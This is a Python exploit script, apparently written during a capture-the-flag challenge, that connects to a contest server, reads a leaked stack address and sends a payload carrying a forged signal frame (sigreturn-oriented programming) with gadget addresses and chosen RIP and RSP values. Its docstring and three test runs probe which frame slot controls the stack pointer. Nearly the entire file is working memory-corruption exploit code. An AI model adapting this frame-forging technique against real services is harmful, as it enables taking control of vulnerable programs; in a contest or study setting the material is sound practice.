#!/usr/bin/env python3
"""Which sigcontext slot becomes RSP, and does the payload tail survive the read?

rip at sigcontext+0x80 is already confirmed (the previous run executed 0x401017).
Aim RSP at buf+0x88, a low offset no short read can lose, whose payload content is
the constant 0x401069; if that comes back, sigcontext+0x78 is the right slot and the
earlier zeros were the marker at buf+0x300 never having been written.
"""
import socket
import struct
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, SC, LEAK = 0x401032, 0x401069, 0x401017
FRAME_AT, FRAME_LEN, B = 0x90, 0x170, 0x28
MARKER = 0x4142434445464748


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


def go(name, rsp_val, plen=0x180, rsp_off=0x78, rip_off=0x80, rip=LEAK):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        L = struct.unpack("<Q", recvn(s, 8))[0]
        buf = L - 0x78
        body = bytearray(b"\x90" * 0x400)
        struct.pack_into("<Q", body, 0x80, G1)
        struct.pack_into("<Q", body, 0x88, SC)
        struct.pack_into("<Q", body, 0x300, MARKER)
        f = bytearray(FRAME_LEN)
        struct.pack_into("<Q", f, B + rip_off, rip)
        struct.pack_into("<Q", f, B + rsp_off, rsp_val)
        struct.pack_into("<Q", f, B + 0x88, 0x246)
        struct.pack_into("<Q", f, B + 0x90, 0x33 | (0x2B << 48))
        body[FRAME_AT:FRAME_AT + FRAME_LEN] = f
        s.sendall(b"\x90" * 24 + bytes(body[:plen]))
        time.sleep(0.5)
        pre = drain(s, 0.3)
        s.sendall(b"Z" * 15)
        time.sleep(0.5)
        got = pre + drain(s, 2.0)
        print("%-32s buf=%#x plen=%#x rsp_off=%#x n=%d %s" % (
            name, buf, plen, rsp_off, len(got), got[:16].hex()))
        if len(got) >= 8:
            print("      -> %#x" % struct.unpack("<Q", got[:8])[0])
    finally:
        s.close()
    time.sleep(0.6)


if __name__ == "__main__":
    L0 = None
    s = socket.create_connection((HOST, PORT), timeout=20)
    L0 = struct.unpack("<Q", recvn(s, 8))[0] - 0x78
    s.close()
    time.sleep(0.5)
    go("rsp->buf+0x88 (want 0x401069)", L0 + 0x88)
    go("rsp->buf+0x300 short payload", L0 + 0x300, plen=0x180)
    go("rsp->buf+0x300 full payload", L0 + 0x300, plen=0x308)
